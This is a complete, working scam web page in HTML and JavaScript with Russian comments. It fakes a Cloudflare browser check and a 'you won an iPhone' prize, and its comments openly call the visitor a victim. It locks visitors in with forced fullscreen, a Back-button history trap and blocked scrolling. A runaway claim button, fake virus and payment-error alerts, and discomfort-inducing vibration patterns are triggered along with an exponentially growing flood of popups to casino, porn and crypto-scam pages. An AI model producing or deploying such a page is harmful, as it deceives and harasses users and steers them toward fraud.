<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Системное уведомление / System Alert</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #3b82f6;
            --danger: #ef4444;
            --success: #22c55e;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            overflow: hidden; /* Запрещаем скролл, чтобы жертва не сбежала  */
            touch-action: none; /* Жестко блокируем свайпы, pull-to-refresh и зум на мобильных */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        /* Имитация проверки Cloudflare при загрузке */
        .fake-loader {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #ffffff;
            color: #333;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            transition: opacity 0.5s;
        }
        
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Основной контейнер ловушки */
        .scam-container {
            background: var(--card-bg);
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 40px 30px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            position: relative;
            z-index: 10;
        }

        .alert-icon {
            font-size: 4em;
            margin-bottom: 10px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .title {
            font-size: 2em;
            font-weight: 800;
            margin-bottom: 15px;
            background: linear-gradient(90deg, #ef4444, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .desc {
            font-size: 1.1em;
            color: var(--text-muted);
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .timer-box {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 30px;
            font-size: 1.2em;
        }

        .timer {
            color: var(--danger);
            font-weight: 900;
            font-size: 1.5em;
            font-variant-numeric: tabular-nums;
        }
        
        .timer.blink { animation: blinker 0.3s linear infinite; } /*  */
        @keyframes blinker { 50% { opacity: 0; } } /*  */

        /* Смертоносная кнопка */
        .btn-wrapper {
            position: relative;
            height: 60px;
            width: 100%;
        }

        .runaway-btn {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            background: var(--success);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(34, 197, 94, 0.3);
            white-space: nowrap;
            transition: transform 0.15s cubic-bezier(0.2, 0, 0, 1); /* Плавный отскок  */
            z-index: 100;
        }

        /* Современные фейковые уведомления */
        .modern-toast {
            position: fixed;
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid #334155;
            color: white;
            padding: 15px 20px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
            display: flex;
            align-items: flex-start;
            gap: 15px;
            z-index: 9999;
            width: 320px;
            max-width: 90vw; /* Адаптив для окон  */
            animation: slideIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
            transition: transform 0.2s, filter 0.2s;
        }

        @keyframes slideIn {
            from { transform: translateY(50px) scale(0.9); opacity: 0; }
            to { transform: translateY(0) scale(1); opacity: 1; }
        }

        .toast-icon { font-size: 1.5em; }
        .toast-content { flex: 1; }
        .toast-title { font-weight: bold; font-size: 0.9em; margin-bottom: 5px; color: var(--danger); }
        .toast-msg { font-size: 0.85em; color: var(--text-muted); }
        .toast-close { color: #64748b; font-weight: bold; padding-left: 10px; font-size: 1.2em; }
        .toast-close:hover { color: var(--danger); }

        /* ЖЕСТКИЙ МОБИЛЬНЫЙ АДАПТИВ */
        @media (max-width: 600px) {
            .title { font-size: 1.4em; }
            .scam-container { padding: 25px 15px; width: 95%; }
            .desc { font-size: 1em; }
            .timer-box { font-size: 1.1em; padding: 10px; }
            .runaway-btn { font-size: 1.1em; padding: 12px 24px; }
            
            /* На мобилках окна спавнятся почти на всю ширину и центрируются лучше */
            .modern-toast {
                width: 95vw;
                max-width: none;
                padding: 12px 15px;
                gap: 10px;
            }
            .toast-icon { font-size: 1.3em; }
            .toast-title { font-size: 0.85em; }
            .toast-msg { font-size: 0.8em; }
        }
    </style>
</head>
<body>

    <!-- Фейковый лоадер -->
    <div class="fake-loader" id="loader">
        <div class="spinner"></div>
        <h2>Проверка безопасности подключения...</h2>
        <p style="color: #666; margin-top: 10px;">Пожалуйста, подождите, мы проверяем ваш браузер.</p>
    </div>

    <!-- Основной контент -->
    <div class="scam-container">
        <div class="alert-icon">🎁</div>
        <div class="title">ВЫ ВЫИГРАЛИ IPHONE 30 PRO MAX!</div> <!--  -->
        <div class="desc">
            Ваш IP-адрес был выбран <b style="color: var(--success);">СЛУЧАЙНО!</b> Наш алгоритм определил вас как победителя акции. <!--  -->
        </div>
        
        <div class="timer-box">
            Резерв приза истекает через:<br>
            <span class="timer" id="timer">10:00</span> <!--  -->
        </div>

        <div class="btn-wrapper" id="arena">
            <button class="runaway-btn" id="runaway">ЗАБРАТЬ ПРИЗ!!!</button> <!--  -->
        </div>
    </div>

    <script>
        // 1. Имитация снятия защиты Cloudflare
        window.onload = () => {
            setTimeout(() => {
                const loader = document.getElementById('loader');
                loader.style.opacity = '0';
                setTimeout(() => loader.style.display = 'none', 500);
                
                if (navigator.vibrate) navigator.vibrate(100);
            }, 2500);
        };

        // 2. Инициализация мобильного кошмара (Full screen & History Trap)
        let initializedNightmare = false;
        
        function initMobileNightmare() {
            if (initializedNightmare) return;
            initializedNightmare = true;

            // Захват полноэкранного режима (скрывает адресную строку)
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => console.log(e));
            } else if (document.documentElement.webkitRequestFullscreen) { // Safari
                document.documentElement.webkitRequestFullscreen().catch(e => console.log(e));
            }

            // History API Trap: Забиваем историю браузера, чтобы кнопка "Назад" не работала
            for (let i = 0; i < 20; i++) {
                window.history.pushState(null, document.title, window.location.href);
            }
            
            // Наказываем за попытку нажать системную кнопку "Назад" (особенно на Android)
            window.addEventListener('popstate', function () {
                window.history.pushState(null, document.title, window.location.href);
                triggerTrap(); // Вызываем геометрическую прогрессию окон
            });
        }

        // Перехватываем первое касание по экрану для запуска ловушек (браузеры требуют взаимодействия)
        document.body.addEventListener('touchstart', initMobileNightmare, { once: true });
        document.body.addEventListener('click', initMobileNightmare, { once: true });

        // 3. Логика плавно убегающей кнопки
        const btn = document.getElementById('runaway');
        const arena = document.getElementById('arena');

        function moveButton(e) {
            if (e.type === 'touchstart') {
                e.preventDefault(); // Блокируем тап, чтобы кнопка успела убежать 
                if (navigator.vibrate) navigator.vibrate(50); // Микро-вибрация 
            }

            btn.style.position = 'fixed';
            
            const maxX = window.innerWidth - btn.offsetWidth;
            const maxY = window.innerHeight - btn.offsetHeight;
            
            const randomX = Math.max(10, Math.floor(Math.random() * maxX));
            const randomY = Math.max(10, Math.floor(Math.random() * maxY));
            
            btn.style.left = '0';
            btn.style.top = '0';
            btn.style.transform = `translate(${randomX}px, ${randomY}px)`;
        }

        btn.addEventListener('mouseenter', moveButton); // 
        btn.addEventListener('touchstart', moveButton, { passive: false }); // 

        btn.addEventListener('click', (e) => {
            e.preventDefault();
            triggerTrap(); // 
        });

        // 4. Логика ловушки с ГЕОМЕТРИЧЕСКОЙ ПРОГРЕССИЕЙ
        const spamUrls = [
            "casino.html", // 
            "prn.html", // 
            "arabADS.html", // 
            "free_robux_generator.html", // 
            "cryptoscam.html", // 
            "enlarge_your_pc.html", // 
            "magic_taro_oracle.html", // 
            "hot_singles_in_your_area.html" // 
        ];

        function getRandomSpamUrl() {
            return spamUrls[Math.floor(Math.random() * spamUrls.length)]; // 
        }

        let trapCount = 0;

        function triggerTrap() {
            trapCount++;
            let multiplier = Math.pow(2, trapCount);

            if (navigator.vibrate) {
                // На мобильных длинный паттерн вибрации вызывает физический дискомфорт
                navigator.vibrate([300, 100, 400, 100, 500, 100, 600]); 
            }

            let popupBlocked = false;

            for(let i = 0; i < multiplier; i++) {
                try {
                    let newWin = window.open(getRandomSpamUrl(), '_blank'); // 
                    if (!newWin || newWin.closed || typeof newWin.closed === 'undefined') {
                        popupBlocked = true;
                    }
                } catch (e) {
                    popupBlocked = true;
                }
            }
            
            let domSpamCount = popupBlocked ? multiplier * 3 : multiplier;

            for(let i = 0; i < domSpamCount; i++) {
                setTimeout(createToast, i * 150);
            }
        }

        document.body.addEventListener('click', (e) => {
            if (e.target.id !== 'runaway' && document.getElementById('loader').style.display === 'none') {
                triggerTrap();
            }
        });

        // 5. Генератор современных фейковых окон
        const messages = [
            { icon: "🚨", title: "КРИТИЧЕСКАЯ УГРОЗА", text: "Обнаружен вирус Win32.Trojan.Lol" }, // 
            { icon: "💋", title: "НОВОЕ СООБЩЕНИЕ", text: "HOT SINGLES IN YOUR AREA WANT TO CHAT" }, // 
            { icon: "⚠️", title: "СИСТЕМНАЯ ОШИБКА", text: "Нехватка виртуальной памяти. Системный диск перегружен." }, // 
            { icon: "💳", title: "ОШИБКА ОПЛАТЫ", text: "Ваша транзакция отклонена. Обновите данные." }
        ];

        function createToast() {
            if (navigator.vibrate) navigator.vibrate([50, 50]);

            const toast = document.createElement('div');
            toast.className = 'modern-toast';
            
            // На мобильных устройствах окна должны спавниться так, чтобы они не вылезали за экран, 
            // иначе это сломает дизайн. Используем более точные расчеты.
            const isMobile = window.innerWidth <= 600;
            const toastWidth = isMobile ? window.innerWidth * 0.95 : 320;
            
            const maxLeft = Math.max(5, window.innerWidth - toastWidth - 10);
            const maxTop = Math.max(10, window.innerHeight - 100);
            
            toast.style.left = Math.random() * maxLeft + 'px'; // 
            toast.style.top = Math.random() * maxTop + 'px'; // 
            
            const msg = messages[Math.floor(Math.random() * messages.length)]; // 
            
            toast.innerHTML = `
                <div class="toast-icon">${msg.icon}</div>
                <div class="toast-content">
                    <div class="toast-title">${msg.title}</div>
                    <div class="toast-msg">${msg.text}</div>
                </div>
                <div class="toast-close">✕</div>
            `;
            
            toast.addEventListener('click', (e) => {
                e.stopPropagation(); 
                toast.style.transform = 'scale(0.95)';
                toast.style.filter = 'grayscale(0.8)';
                toast.querySelector('.toast-close').innerText = '☠️';
                triggerTrap(); // 
            });
            
            document.body.appendChild(toast); // 
        }

        setInterval(() => {
            if(document.getElementById('loader').style.display === 'none') {
                createToast();
            }
        }, 3000);

        // 6. Фейковый таймер 
        let timeLeft = 600; // 
        const timerEl = document.getElementById('timer'); // 
        setInterval(() => {
            if (timeLeft > 0 && document.getElementById('loader').style.display === 'none') {
                timeLeft--; // 
                const m = Math.floor(timeLeft / 60).toString().padStart(2, '0'); // 
                const s = (timeLeft % 60).toString().padStart(2, '0'); // 
                timerEl.innerText = `${m}:${s}`; // 
                
                if (timeLeft < 50) timerEl.classList.add('blink'); // 
            }
        }, 1000); 

        // 7. Засада по времени 
        setTimeout(() => {
            if(document.getElementById('loader').style.display === 'none') {
                triggerTrap(); 
            }
        }, 12000); 
    </script>
</body>
</html>
